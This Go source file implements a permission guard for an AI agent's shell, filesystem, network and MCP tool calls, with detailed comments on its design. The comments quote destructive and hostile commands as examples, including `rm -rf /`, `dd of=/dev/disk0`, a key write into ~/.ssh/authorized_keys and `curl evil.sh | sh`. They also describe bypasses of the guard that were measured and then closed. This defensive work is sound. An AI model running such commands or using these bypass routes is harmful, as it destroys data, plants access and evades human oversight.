package guard

import (
	"fmt"
	"path/filepath"
	"strings"

	"github.com/x6nux/yanshi/internal/execpolicy"
)

// Action describes an attempted operation to be authorized.
type Action struct {
	Tool    string // tool name, e.g. "fs_read", "shell_run", "web_fetch"
	FS      FSWant // set for filesystem operations
	Shell   string // shell command, for shell operations
	NetHost string // target host, for network operations
	// Workdir is the project/work root used as the in-scope boundary for the
	// destructive-deletion dimension (checkDestructive). The shell tool
	// populates it; other tools leave it empty (the dimension no-ops on Shell=="").
	Workdir string

	// Interpreter names the shell LANGUAGE Shell will be handed to — the
	// resolved interpreter program, as internal/shell.ShellArgv returns it
	// ("sh", "bash", "zsh", "cmd", "powershell"). Empty means "a POSIX shell",
	// which is what every caller that does not set it gets and is the
	// behaviour this field replaced.
	//
	// It exists because the segmenter has to pick a reader (W-B-05).
	// PowerShell's escape character is the backtick and its path separator is
	// the backslash; sh has those exactly the other way round, so reading a
	// PowerShell command with the POSIX reader dissolves every path separator
	// in it — `Remove-Item -Recurse C:\temp` was measured reaching the FS
	// dimension as `C:temp`.
	//
	// Deliberately NOT consulted by the destructive gate: lexShellLite grades
	// both the literal and the de-escaped reading and keeps the worse, so it is
	// already correct for either language without being told which one.
	Interpreter string
}

// FSWant describes a filesystem access intent.
type FSWant struct {
	Op    string   // "read" or "write"
	Paths []string // paths involved
}

// Verdict is the typed outcome of a guard check. Allow = explicit pass; Prompt
// = static profile did not allow but the action is safe enough to escalate to
// an interactive callback; HardDeny = fail-closed (no profile, empty
// Tools.Allow, unreadable shell structure, unknown policy, deny rule, deny
// flag, parser failure) — the callback layer MUST NOT override a HardDeny on
// its own.
//
// HardDeny splits further by the Decision.Overridable flag:
//   - Overridable=false (structural): catastrophic mass deletion, command
//     nesting deeper than the guard will unwrap, unreadable shell structure,
//     execpolicy parse-error, unknown shell policy, unknown execpolicy verdict.
//     Never overridable — not by the callback, not by YOLO/auto. This is the
//     immovable floor, and it is exactly the set produced by hardDeny() plus
//     the two inline HardDenies in checkShellPolicy.
//     Catastrophic deletion belongs here and is the one an operator is most
//     likely to reason about: `rm -rf /` under yolo is refused by THIS flag,
//     not by any profile.
//   - Overridable=true (profile-policy choice): empty Tools.Allow, empty FS
//     read/write list, shell policy="deny", denylist match, execpolicy hard_deny
//     rules, net.allow=false, empty MCP allowlist. These are all configuration
//     choices, so the YOLO and Auto interactive modes may set them aside via the
//     callback (tools.Authorize routes them to mode resolution). default/
//     allow-edits/plan modes and the SSE path still treat them as fail-closed.
type Verdict uint8

// Guard verdict values.
const (
	Allow Verdict = iota
	Prompt
	HardDeny
)

// Decision is the guard's verdict for an Action. Reason remains the human-
// readable explanation (kept for backwards compatibility with the old
// {Allowed bool; Reason string} shape via the IsAllowed() shim).
//
// Promptable is the single source of truth for "may the approval callback
// override this?" for a Prompt verdict — orchestrator/tools/transport consult
// Promptable rather than re-deriving it from Verdict, so the HardDeny firewall
// stays in one place. RuleID/Justification carry the execpolicy explanation
// when set.
//
// Overridable only applies to HardDeny (see the Verdict doc): it marks a
// profile-policy default deny that YOLO/Auto interactive modes may override.
// It is ignored for Allow/Prompt. Structural HardDenies set it false so they
// remain an immovable floor even under YOLO.
type Decision struct {
	Verdict       Verdict
	Reason        string
	RuleID        string
	Justification string
	Promptable    bool
	Overridable   bool
}

// IsAllowed is a binary convenience for call sites that do not need to
// distinguish Prompt from HardDeny. Security-sensitive code (Authorize) MUST
// switch on Verdict/Promptable directly.
func (d Decision) IsAllowed() bool { return d.Verdict == Allow }

// allow/prompt/hardDeny are the only constructors for Decision — they keep the
// Promptable/Verdict pairing consistent so the HardDeny firewall cannot be
// bypassed by accidentally flipping one but not the other at a call site.
func allow() Decision { return Decision{Verdict: Allow} }

func prompt(reason string) Decision {
	return Decision{Verdict: Prompt, Reason: reason, Promptable: true}
}

func hardDeny(reason string) Decision {
	return Decision{Verdict: HardDeny, Reason: reason, Promptable: false}
}

// overridableDeny is a HardDeny that arises from a profile POLICY default
// (empty allowlist, shell policy="deny", net.allow=false) rather than a
// structural guard. It stays fail-closed on the SSE path and under
// default/allow-edits/plan modes, but YOLO/Auto interactive modes may override
// it via the permission callback (tools.Authorize routes Overridable HardDenies
// to mode resolution).
//
// The structural floor — the denials YOLO cannot buy its way past — is exactly
// the set that reaches hardDeny() or an inline Decision without Overridable:
// catastrophic mass deletion, command nesting deeper than the guard will
// unwrap (DestructionUnreadable, W-B-03), unreadable shell structure,
// execpolicy parse-error, and unknown shell policy / unknown execpolicy
// verdict. The first two both come out of checkDestructive and they are NOT
// the same denial: one says "this is a disaster", the other says "we ran out
// of budget before we could tell", and they carry different reasons because a
// refusal that misdescribes what it refused sends the reader looking for the
// wrong command.
// Everything a profile can merely have an opinion about is overridable, and
// that includes two denials this comment used to misfile as structural: a
// denylist pattern match and an empty MCP allowlist. Both are profile policy,
// so both yield to YOLO/Auto.
//
// The second class was called "shell metacharacters" until INF1 (ADR-0004
// supplement) split chains into segments and judged each one. The class did not
// leave the floor and the floor did not shrink — its membership test moved from
// a substring scan for && ; | > to "execpolicy.ParseCommandList could not read
// this", which still covers command substitution, process substitution,
// subshells, here-documents, background & and unterminated quotes.
//
// Enumerate the floor with `grep -n 'hardDeny(' internal/guard/guard.go` plus
// the two inline HardDenies in checkShellPolicy rather than trusting this list.
func overridableDeny(reason string) Decision {
	return Decision{Verdict: HardDeny, Reason: reason, Promptable: false, Overridable: true}
}

// Guard checks Actions against a PermissionProfile.
type Guard struct{}

// New returns a Guard.
func New() *Guard { return &Guard{} }

// Check returns whether the profile permits the action, checking every
// applicable dimension. The first non-Allow dimension short-circuits (with the
// one documented exception below). The returned Decision carries a typed
// Verdict and Promptable flag so callers (Authorize/transport) can enforce a
// HardDeny firewall without re-deriving it.
//
// When every dimension passes, Check returns the Allow Decision from the LAST
// check that produced one (rather than a generic empty Allow). This preserves
// any RuleID/Justification a dimension set (e.g. the execpolicy layer in
// checkShellPolicy) so the explainability signal flows to the caller verbatim.
//
// The dimension ORDER below is load-bearing and unchanged (destructive → mcp →
// tools → fs → shell → net). What changed with INF1 is how the FIRST dimension
// exits.
//
// checkDestructive can return two very different things: a Catastrophic
// structural HardDeny, and an out-of-workdir Prompt. Short-circuiting on the
// HardDeny is right — nothing downstream can be stricter than the immovable
// floor. Short-circuiting on the PROMPT is not, and it stopped being merely
// untidy once checkShell learned to judge chains: `rm /etc/passwd && <something
// checkShell hard-denies>` would return the destructive Prompt and hand a
// command to the approval callback that the shell dimension refuses outright.
// Before INF1 the same shape was invisible, because checkDestructive declined
// to classify anything containing a control operator at all.
//
// So the Prompt is carried as a FLOOR and folded (moreSevere) into whatever the
// remaining dimensions decide. Folding can only tighten: moreSevere(Prompt,
// Allow) is the Prompt itself, byte for byte what short-circuiting returned,
// and every other combination is at least as strict.
func (g *Guard) Check(p PermissionProfile, a Action) Decision {
	d := g.check(p, a)
	// SECOND READING: the command after the parameter expansions the string
	// itself defines. `rm -rf "${x:-/}"` carries no `$(`, so nothing above it
	// re-splits or re-decodes anything; it was measured walking a straight line
	// from a plain-looking string to Allow while /bin/sh ran `rm -rf /`.
	//
	// Folded with moreSevere and never substituted for the first reading, so a
	// resolution can only reveal danger — the rule classifyLexed already applies
	// to wrapper payloads. expandKnownParameters resolves nothing whose value is
	// absent from the string, which is what keeps `rm -rf $BUILD_DIR` out of the
	// catastrophic tier; see its header.
	if a.Shell != "" {
		if expanded, changed := expandKnownParameters(a.Shell); changed {
			b := a
			b.Shell = expanded
			d = moreSevere(d, g.check(p, b))
		}
	}
	return d
}

// check is Check for ONE reading of the command. It is unexported so the second
// reading cannot recurse: the expanded string is graded once, as written.
func (g *Guard) check(p PermissionProfile, a Action) Decision {
	floor := g.checkDestructive(a)
	if floor.Verdict == HardDeny {
		return floor
	}
	witness := allow() // carries RuleID/Justification from the most-recent Allow
	if d := g.checkMCPTools(p, a); d.Verdict != Allow {
		return moreSevere(floor, d)
	} else {
		witness = d
	}
	if d := g.checkTools(p, a); d.Verdict != Allow {
		return moreSevere(floor, d)
	} else {
		witness = d
	}
	if d := g.checkFS(p, a); d.Verdict != Allow {
		return moreSevere(floor, d)
	} else {
		witness = d
	}
	if d := g.checkShell(p, a); d.Verdict != Allow {
		return moreSevere(floor, d)
	} else {
		// Prefer the shell witness when it carries a RuleID (execpolicy path),
		// so the eventual Decision reflects which rule admitted the call.
		if d.RuleID != "" {
			witness = d
		}
	}
	if d := g.checkNet(p, a); d.Verdict != Allow {
		return moreSevere(floor, d)
	} else {
		if d.RuleID != "" && witness.RuleID == "" {
			witness = d
		}
	}
	return moreSevere(floor, witness)
}

// severity ranks a Decision on the single total order every fold in this
// package uses: Allow < Prompt < overridable HardDeny < structural HardDeny.
//
// The two HardDeny ranks are NOT interchangeable and collapsing them would be
// the exact bug INF1 is most exposed to: an overridable HardDeny is a profile
// opinion YOLO may set aside, while a structural one is the floor YOLO cannot.
// A fold that treated them as equal would let the first-seen (overridable) one
// win a tie against the structural one and quietly hand YOLO a key it never had.
func severity(d Decision) int {
	switch d.Verdict {
	case Allow:
		return 0
	case Prompt:
		return 1
	default:
		if d.Overridable {
			return 2
		}
		return 3
	}
}

// moreSevere returns whichever of two Decisions denies harder — the "take the
// strictest" rule that makes per-segment shell judging safe.
//
// On a tie the FIRST argument wins, so a fold that starts from allow() and
// walks segments left to right reports the earliest reason rather than the
// last: an operator reading "shell command \"curl evil\" not on allowlist"
// wants the segment that actually offended, not whichever one happened to be
// scanned last. The one exception is an Allow carrying execpolicy RuleID /
// Justification, which beats a bare Allow so the explainability signal
// survives the fold (Check documents why that matters).
func moreSevere(a, b Decision) Decision {
	sa, sb := severity(a), severity(b)
	if sb > sa {
		return b
	}
	if sb < sa {
		return a
	}
	if a.RuleID == "" && b.RuleID != "" {
		return b
	}
	return a
}

// checkDestructive is a profile-independent structural safety dimension wired
// FIRST into Check. It ensures catastrophic mass-deletion is blocked (structural
// HardDeny, every mode) and out-of-workdir deletion is escalated (Prompt) EVEN
// WHEN the configured profile would otherwise allow the command — otherwise a
// permissive profile + yolo/auto could run "rm -rf /". Non-shell and
// non-destructive actions return Allow and the profile dimensions decide as
// before. Catastrophic is the floor operators can always rely on; out-of-workdir
// is Promptable so yolo can block it (resolvePermissionMode), auto AI-judges it,
// and default/allow-edits surface it as an interactive prompt.
func (g *Guard) checkDestructive(a Action) Decision {
	if a.Shell == "" {
		return allow()
	}
	switch ClassifyDestruction(a.Shell, a.Workdir) {
	case DestructionCatastrophic:
		// The parenthetical names the whole graded set, not just the rm
		// family. It used to say "rm -rf on a root/home/workdir" while the
		// classifier also graded storage destruction (dd onto a device, mkfs,
		// wipefs — see storage.go), so an operator who ran `dd of=/dev/disk0`
		// was told their rm had been blocked. A denial that misdescribes what
		// it refused sends the reader looking for the wrong command.
		return hardDeny("catastrophic destruction blocked (mass deletion of a root/home/workdir, or destruction of a raw storage device)")
	case DestructionUnreadable:
		// A DIFFERENT refusal with a DIFFERENT reason, and it has to say so.
		// Reusing the catastrophic text would tell an operator their `rm` was
		// blocked for a command that may contain no deletion at all — the same
		// mistake the parenthetical above was written to fix. What happened is
		// that the command nests wrappers deeper than the unwrap budget, so the
		// program that would run was never reached.
		return hardDeny("shell command nests command wrappers deeper than the guard will unwrap; the program that would actually run cannot be identified")
	case DestructionOpaque:
		// A THIRD refusal with a third reason. It is a Prompt rather than a
		// floor because the guard is not saying the command is dangerous — it
		// is saying it could not read part of it, which is a reason to ask a
		// human and not a reason to make `python3 -c` unrunnable in every mode.
		// opaque.go's header carries the argument in full.
		return prompt("shell command carries a payload this guard does not read " +
			"(an interpreter's -c/-e operand, or an encoded command); nobody has seen what it runs")
	case DestructionOutOfScope:
		return prompt("deletion outside the working directory")
	default:
		return allow()
	}
}

// checkMCPTools applies only to runtime names with the reserved mcp_ prefix.
// It is deliberately separate from checkTools so a broad Tools.Allow pattern
// (notably the historical "*") cannot silently authorize newly configured MCP
// servers. The profile must opt in to the exact server/tool name or a matching
// MCP-specific glob. The empty-allowlist deny is OVERRIDABLE: yolo/auto treat
// MCP opt-in like any other profile policy (yolo bypasses, auto AI-judges),
// while default/allow-edits/SSE stay fail-closed. A non-matching mcp_ name under
// a non-empty allowlist is PROMPTABLE (interactive user may approve).
func (g *Guard) checkMCPTools(p PermissionProfile, a Action) Decision {
	if !strings.HasPrefix(a.Tool, "mcp_") {
		return Decision{Verdict: Allow}
	}
	if len(p.MCP.Allow) == 0 {
		return overridableDeny("no MCP tools permitted by profile")
	}
	name := filepath.ToSlash(a.Tool)
	for _, pat := range p.MCP.Allow {
		if ok, err := MatchGlob(filepath.ToSlash(pat), name); err == nil && ok {
			return allow()
		}
	}
	return prompt(fmt.Sprintf("MCP tool %q not permitted", a.Tool))
}

func (g *Guard) checkTools(p PermissionProfile, a Action) Decision {
	if len(p.Tools.Allow) == 0 {
		return overridableDeny("no tools permitted by profile")
	}
	for _, pat := range p.Tools.Allow {
		if ok, err := MatchGlob(filepath.ToSlash(pat), filepath.ToSlash(a.Tool)); err == nil && ok {
			return allow()
		}
	}
	// Tool-not-on-allowlist is PROMPTABLE: an interactive user may approve a
	// new tool. Only the structural "no tools allowed at all" case above is
	// HardDeny.
	return prompt(fmt.Sprintf("tool %q not permitted", a.Tool))
}

// checkFS authorizes a filesystem intent in two stages.
//
// Stage 1 is the built-in sensitive-credential denylist (checkSensitiveFS,
// sensitive.go), which runs BEFORE the profile's globs. It has to run first
// for the gate to exist at all: the profile layer's job is to answer "does a
// pattern match", and the shipped example profile's "**" answers yes for
// ~/.ssh/id_rsa. A denylist consulted after a matching allow-glob never runs.
// The denial it produces is a Prompt with a literal-grant escape hatch — see
// the sensitive.go header for why that tier and not a HardDeny.
//
// Stage 2 is the profile's own read/write globs, unchanged.
func (g *Guard) checkFS(p PermissionProfile, a Action) Decision {
	if len(a.FS.Paths) == 0 {
		return allow()
	}
	if d := g.checkSensitiveFS(p, a); d.Verdict != Allow {
		return d
	}
	var allowed []string
	if a.FS.Op == "read" {
		allowed = p.FS.Read
	} else {
		allowed = p.FS.Write
	}
	if len(allowed) == 0 {
		return overridableDeny(fmt.Sprintf("no paths permitted for op %q", a.FS.Op))
	}
	for _, raw := range a.FS.Paths {
		path := filepath.ToSlash(filepath.Clean(raw))
		ok := false
		for _, pat := range allowed {
			if m, err := MatchGlob(filepath.ToSlash(pat), path); err == nil && m {
				ok = true
				break
			}
		}
		if !ok {
			return prompt(fmt.Sprintf("path %q not permitted for op %q", raw, a.FS.Op))
		}
	}
	return allow()
}

// checkShell checks the shell command against the profile's shell policy.
//
// # From "refuse every chain" to "judge every segment" (INF1, ADR-0004)
//
// This function used to reject any command containing a control metacharacter
// (&&, ||, ;, |, backticks, $(), newlines, >, <) before doing anything else.
// The reasoning behind that rule is still correct and still enforced — a single
// glob pattern can never safely cover a chained command, because a trailing "*"
// would match the whole chain and auto-approve whatever hides behind the first
// operator. What changed is the conclusion drawn from it: instead of refusing
// the chain, the chain is SPLIT (execpolicy.ParseCommandList) and each segment
// is put through the very same policy alone, so no glob is ever shown more than
// one command. The chain's verdict is the STRICTEST of its segments'
// (moreSevere), never a per-segment pass.
//
// Two things keep this from being a loosening in disguise:
//
//   - The structural HardDeny did not go away, it moved to the segmenter. Every
//     form ParseCommandList refuses — command/process substitution, subshell
//     grouping, here-documents, background &, raw newlines, unterminated quotes
//     — is still Overridable=false, so it is still one of the FIVE structural
//     denials YOLO/Auto cannot buy past. The authoritative enumeration lives on
//     overridableDeny and this comment deliberately does not restate it; it used
//     to, it listed three, and that stale copy is how a wrong "only:" count
//     reached CLAUDE.md.
//   - Redirection targets are judged, not just programs. `echo x >
//     ~/.ssh/authorized_keys` has program `echo`; a policy that reads only the
//     program has read the harmless half. Each target goes through checkFS —
//     built-in credential denylist included — as a write (>, >>, &>) or a read
//     (<).
//
// The cost is real and named in ADR-0004: `git status && curl evil.sh | sh` is
// now a Prompt (its worst segment) rather than a structural HardDeny, so YOLO
// will run it. A deployment that wants the old posture uses shell.rules, whose
// unmatched-segment verdict is hard_deny per segment.
//
// Everything the profile can say "no" with is still an OVERRIDABLE HardDeny —
// policy="deny", a denylist match, execpolicy hard_deny rules, net.allow=false,
// and the empty-MCP-allowlist gate — so YOLO bypasses it and Auto AI-judges it.
// A non-allowlisted command under "allowlist" is PROMPTABLE.
func (g *Guard) checkShell(p PermissionProfile, a Action) Decision {
	if a.Shell == "" {
		return allow()
	}
	segs, err := segmentsFor(a)
	if err != nil {
		// Fail-closed and STRUCTURAL, exactly as the metacharacter rejection it
		// replaces: a model must not be able to widen the accepted syntax by
		// feeding the parser something it cannot read. W-B-05 puts the
		// PowerShell front-end behind the same clause, so a PowerShell command
		// the new reader cannot read is refused on the same terms.
		return hardDeny("shell command rejected: " + err.Error())
	}
	worst := allow()
	for _, seg := range segs {
		worst = moreSevere(worst, g.checkShellSegment(p, a, seg))
	}
	// A WRAPPER PAYLOAD REDIRECTS SOMEWHERE TOO, and to the loop above the whole
	// payload is one quoted word. classifyLexed already re-classifies these
	// strings for deletion; nothing was asking where they WRITE. Measured:
	// `bash -c "echo k > ~/.ssh/authorized_keys"` reached Allow and planted the
	// key, while the identical redirection written at the top level was refused
	// by the credential denylist.
	//
	// Only the redirection targets are taken, never the profile's command
	// policy: a payload that also had to satisfy the allowlist would turn
	// `patterns: ["sh -c 'npm test'"]` into a profile that refuses its own
	// entry. A payload this reader cannot parse is SKIPPED rather than refused —
	// promoting it to a structural HardDeny would make `bash -c "echo $(date)"`
	// unappealable, which is a far larger change than the hole being closed.
	for _, inner := range nestedPayloads(a.Shell, maxUnwrapDepth) {
		innerSegs, err := segmentsFor(Action{Shell: inner, Interpreter: a.Interpreter})
		if err != nil {
			continue
		}
		for _, seg := range innerSegs {
			worst = moreSevere(worst, g.checkSegmentWrites(p, a, seg))
		}
	}
	return worst
}

// segmentsFor splits a.Shell with the reader for the language it will actually
// be handed to (W-B-05).
//
// The choice itself lives in execpolicy.ParseCommandListFor, and it lives there
// because it has to be the SAME choice tools.scopeFromAction makes. It was not:
// this switch read a.Interpreter and the approval scope did not, so guard knew
// `C:\temp` and `C:temp` were different directories while the approval cache
// held one entry covering both. One function, one answer.
//
// The default is the POSIX reader, in the "no caller set this field" sense
// rather than the "we guessed" sense: guard.Action.Interpreter is populated from
// the resolved interpreter program at the spawn site, so an unset value means
// the command is going to sh — which is what every caller before this field
// existed was doing.
func segmentsFor(a Action) ([]execpolicy.Segment, error) {
	return execpolicy.ParseCommandListFor(a.Interpreter, a.Shell)
}

// checkShellSegment applies the full shell dimension to ONE segment: its
// redirection targets against the FS dimension, and its command text against
// the profile's rules or globs. The segment's verdict is the stricter of the
// two — a segment whose program is allowlisted but whose output is redirected
// into a credential file is not an allowed segment.
func (g *Guard) checkShellSegment(p PermissionProfile, a Action, seg execpolicy.Segment) Decision {
	return moreSevere(g.checkSegmentWrites(p, a, seg), g.checkShellPolicy(p, seg.Text))
}

// checkSegmentWrites is every path a segment WRITES, from both of the two
// places a shell command can name one: a redirection target and an operand.
//
// The second half arrived late and the corpus recorded the gap as a
// single-program boundary (`tee`) while it was a family of at least ten. See
// argvwrite.go.
func (g *Guard) checkSegmentWrites(p PermissionProfile, a Action, seg execpolicy.Segment) Decision {
	worst := g.checkRedirectTargets(p, a, seg)
	program, args, ok := lexShellLite(seg.Text)
	if !ok {
		return worst
	}
	targets := argvWriteTargets(program, args)
	if len(targets) == 0 {
		return worst
	}
	return moreSevere(worst, g.checkFS(p, Action{
		Tool:    a.Tool,
		Workdir: a.Workdir,
		FS:      FSWant{Op: "write", Paths: targets},
	}))
}

// checkRedirectTargets routes every redirection target of a segment through the
// FS dimension.
//
// This is INF1's third load-bearing constraint. Before it, a redirection was
// simply refused, so the question "where does this write land" had never been
// asked; now that redirections are admitted, the answer has to come from
// somewhere, and checkFS is where the answer already lives — including the
// built-in credential denylist (sensitive.go), which is what makes
// `echo … > ~/.ssh/authorized_keys` a Prompt rather than a silent write.
//
// The target is handed over RAW, exactly as fs_read/fs_write hand their paths
// over. checkFS does its own normalization (pathnorm.go expands ~ and $HOME
// before cleaning), and pre-normalizing here would additionally rewrite a
// relative target into an absolute one — which would stop a profile written as
// `write: ["src/**"]` from matching `> src/out.txt`, tightening by accident in a
// way no operator could predict from their config.
//
// A descriptor duplication (`2>&1`) has no path target and is skipped: it
// redirects one of the child's own streams into another and reaches no file the
// other redirections have not already declared.
func (g *Guard) checkRedirectTargets(p PermissionProfile, a Action, seg execpolicy.Segment) Decision {
	worst := allow()
	for _, r := range seg.Redirects {
		if r.Target == "" {
			continue
		}
		op := "write"
		if strings.HasPrefix(strings.TrimLeft(r.Operator, "0123456789"), "<") {
			op = "read"
		}
		worst = moreSevere(worst, g.checkFS(p, Action{
			Tool:    a.Tool,
			Workdir: a.Workdir,
			FS:      FSWant{Op: op, Paths: []string{r.Target}},
		}))
	}
	return worst
}

// checkShellPolicy is the profile's own verdict on ONE command string. It is
// the pre-INF1 body of checkShell with the metacharacter pre-check removed
// (ParseCommandList owns that now) and `a.Shell` replaced by the segment text.
//
// For an unchained command the two are byte-identical — Segment.Text is a
// verbatim slice of the input — which is what makes the segmented path a
// no-behaviour-change refactor for every command that was previously accepted.
//
// execpolicy layer (Task 6): when the profile carries structured Rules,
// evaluate them BEFORE the legacy glob switch. A command reaching here is a
// single, non-chained segment — exactly what execpolicy is designed to reason
// about — so the strict Parse is applied to it unchanged. Parse failure is
// HardDeny("parse-error") and is NOT promptable: a model must not be able to
// expand the policy's accepted syntax by feeding malformed input. An execpolicy
// "allow" short-circuits to Allow (with RuleID/Justification) so a Rules-only
// profile does not fall through to an empty legacy allowlist and turn allowed
// commands into Prompts.
func (g *Guard) checkShellPolicy(p PermissionProfile, cmd string) Decision {
	if len(p.Shell.Rules) > 0 {
		parsed, err := execpolicy.Parse(cmd)
		if err != nil {
			return Decision{Verdict: HardDeny, RuleID: "parse-error", Reason: err.Error(), Justification: "execpolicy parser rejected unsupported shell syntax", Promptable: false}
		}
		result := execpolicy.Evaluate(parsed, p.Shell.Rules)
		switch result.Verdict {
		case "allow":
			return Decision{Verdict: Allow, RuleID: result.RuleID, Reason: result.Reason, Justification: result.Justification, Promptable: false}
		case "prompt":
			return Decision{Verdict: Prompt, RuleID: result.RuleID, Reason: result.Reason, Justification: result.Justification, Promptable: true}
		case "hard_deny", "deny":
			return Decision{Verdict: HardDeny, RuleID: result.RuleID, Reason: result.Reason, Justification: result.Justification, Promptable: false, Overridable: true}
		default:
			return Decision{Verdict: HardDeny, RuleID: result.RuleID, Reason: "unknown execpolicy verdict", Justification: result.Justification, Promptable: false}
		}
	}
	switch p.Shell.Policy {
	case "deny":
		return overridableDeny("shell denied by policy")
	case "", "allowlist":
		for _, pat := range p.Shell.Patterns {
			if ok, err := MatchGlob(pat, cmd); err == nil && ok {
				return allow()
			}
		}
		return prompt(fmt.Sprintf("shell command %q not on allowlist", cmd))
	case "denylist":
		for _, pat := range p.Shell.Patterns {
			if ok, err := MatchGlob(pat, cmd); err == nil && ok {
				return overridableDeny(fmt.Sprintf("shell command %q denied by denylist", cmd))
			}
		}
		return allow()
	}
	return hardDeny(fmt.Sprintf("unknown shell policy %q", p.Shell.Policy))
}

func (g *Guard) checkNet(p PermissionProfile, a Action) Decision {
	if a.NetHost == "" {
		return allow()
	}
	if !p.Net.Allow {
		return overridableDeny("network access denied")
	}
	if len(p.Net.Hosts) == 0 {
		return allow() // allow=true with no host restriction
	}
	host := strings.ToLower(a.NetHost)
	for _, pat := range p.Net.Hosts {
		if ok, err := MatchGlob(strings.ToLower(pat), host); err == nil && ok {
			return allow()
		}
	}
	return prompt(fmt.Sprintf("host %q not permitted", a.NetHost))
}
